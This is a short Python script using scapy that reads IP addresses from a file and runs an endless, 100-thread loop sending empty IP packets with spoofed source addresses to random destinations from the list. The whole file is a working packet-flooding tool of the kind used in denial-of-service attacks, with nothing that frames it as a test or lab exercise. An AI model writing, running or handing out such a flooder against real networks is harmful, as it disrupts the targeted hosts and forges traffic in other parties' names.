from scapy.all import IP, send
from concurrent.futures import ThreadPoolExecutor
import random
import time

def send_random_null_packet(ip_list):
    """Send a null packet from a random source IP to a random destination IP."""
    src_ip = random.choice(ip_list)
    dst_ip = random.choice(ip_list)
    # Avoid sending packets to self
    while dst_ip == src_ip:
        dst_ip = random.choice(ip_list)

    packet = IP(src=src_ip, dst=dst_ip) / ""
    send(packet, verbose=0)
    print(f"Sent null packet from {src_ip} to {dst_ip}")

def continuous_packet_flood(ip_list, max_threads=100):
    """Continuously send null packets between random IPs in the list."""
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        while True:
            # Schedule tasks to send packets in parallel
            for _ in range(max_threads):
                executor.submit(send_random_null_packet, ip_list)
            # Brief sleep to avoid excessive resource usage
            time.sleep(0.1)

def load_ip_list(filename):
    """Load list of IPs from the provided text file."""
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

if __name__ == "__main__":
    # Load IPs from file
    ip_list = load_ip_list("ips.txt")
    # Start continuous packet sending
    continuous_packet_flood(ip_list)
